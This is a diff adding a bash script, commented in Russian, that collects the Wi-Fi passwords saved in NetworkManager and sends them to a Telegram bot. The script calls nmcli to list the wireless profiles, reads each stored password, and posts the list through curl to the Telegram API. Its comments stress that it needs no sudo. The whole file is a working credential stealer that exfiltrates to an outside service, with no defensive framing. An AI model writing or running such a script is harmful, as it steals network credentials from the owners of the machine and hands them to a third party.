@@ -1,0 +1,48 @@
+#!/usr/bin/env bash
+#
+# Скрипт для сбора сохранённых Wi-Fi паролей и отправки их в Telegram
+# Не требует sudo (если nmcli позволяет получить psk без привилегий)
+#
+# Перед использованием замените BOT_TOKEN и CHAT_ID на свои значения.
+
+BOT_TOKEN="ВАШ_BOT_TOKEN"
+CHAT_ID="ВАШ_CHAT_ID"
+
+# Функция отправки сообщения в Telegram
+send_to_telegram() {
+    local text="$1"
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d parse_mode="Markdown" \
+        -d text="${text}" >/dev/null
+}
+
+# Проверяем, доступен ли nmcli для обычного пользователя
+if ! command -v nmcli >/dev/null 2>&1; then
+    send_to_telegram "❌ nmcli не найден. Убедитесь, что NetworkManager установлен."
+    exit 1
+fi
+
+# Получаем список профилей Wi-Fi (с типом 802-11-wireless)
+mapfile -t SSIDS < <(nmcli -t -f NAME,TYPE connection show | awk -F: '$2=="802-11-wireless" { print $1 }')
+
+if [ "${#SSIDS[@]}" -eq 0 ]; then
+    send_to_telegram "⚠️ Не найдено сохранённых Wi-Fi сетей."
+    exit 0
+fi
+
+# Собираем сообщение
+MESSAGE="📡 *Список Wi-Fi и паролей:*\n\n"
+
+for SSID in "${SSIDS[@]}"; do
+    # Пытаемся получить пароль (psk). nmcli вернёт его без sudo, если есть разрешение.
+    PWD=$(nmcli -s -g 802-11-wireless-security.psk connection show "$SSID" 2>/dev/null)
+    if [ -z "$PWD" ]; then
+        MESSAGE+="• *${SSID}* — _пароль не получен_\n"
+    else
+        MESSAGE+="• *${SSID}* — \`${PWD}\`\n"
+    fi
+done
+
+# Отправляем в Telegram
+send_to_telegram "$MESSAGE"
